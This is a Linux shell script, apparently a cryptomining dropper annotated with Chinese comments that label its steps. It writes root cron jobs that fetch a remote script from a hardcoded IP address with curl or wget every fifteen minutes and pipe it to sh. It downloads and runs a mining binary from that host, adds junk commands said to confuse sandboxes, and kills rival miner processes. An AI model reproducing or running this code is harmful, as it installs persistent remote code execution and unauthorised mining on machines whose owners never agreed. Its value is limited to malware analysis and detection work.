export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

# 创建病毒定时任务
mkdir -p /var/spool/cron/crontabs
echo "" > /var/spool/cron/root
echo "*/15 * * * * (/usr/bin/mspi139f||/usr/libexec/mspi139f||/usr/local/bin/mspi139f||/tmp/mspi139f||curl -fsSL -m180 http://67.205.168.20:8000/i.sh||wget -q -T180 -O- http://67.205.168.20:8000/i.sh) | sh" >> /var/spool/cron/root
cp -f /var/spool/cron/root /var/spool/cron/crontabs/root

# 垃圾代码，用于混淆沙箱
cd /tmp
touch /usr/local/bin/writeable && cd /usr/local/bin/
touch /usr/libexec/writeable && cd /usr/libexec/
touch /usr/bin/writeable && cd /usr/bin/
rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable

# 下载挖矿elf文件mspi139f，并运行
export PATH=$PATH:$(pwd)
ps auxf | grep -v grep | grep mspi139f || rm -rf mspi139f
if [ ! -f "mspi139f" ]; then
    curl -fsSL -m1800 http://67.205.168.20:8000/static/5023/ddgs.$(uname -m) -o mspi139f||wget -q -T1800 http://67.205.168.20:8000/static/5023/ddgs.$(uname -m) -O mspi139f
fi
chmod +x mspi139f
/usr/bin/mspi139f||/usr/libexec/mspi139f||/usr/local/bin/mspi139f||/tmp/mspi139f

# 清除其他挖矿病毒
ps auxf | grep -v grep | grep mspibcb | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspibcc | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspibcd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspibce | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa0 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa1 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa2 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa3 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa4 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa5 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa6 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa7 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspifa8 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep mspi1390 | awk '{print $2}' | xargs kill -9

echo "*/15 * * * * (/usr/bin/mspi139f||/usr/libexec/mspi139f||/usr/local/bin/mspi139f||/tmp/mspi139f||curl -m180 -fsSL http://67.205.168.20:8000/i.sh||wget -q -T180 -O- http://67.205.168.20:8000/i.sh) | sh" | crontab -

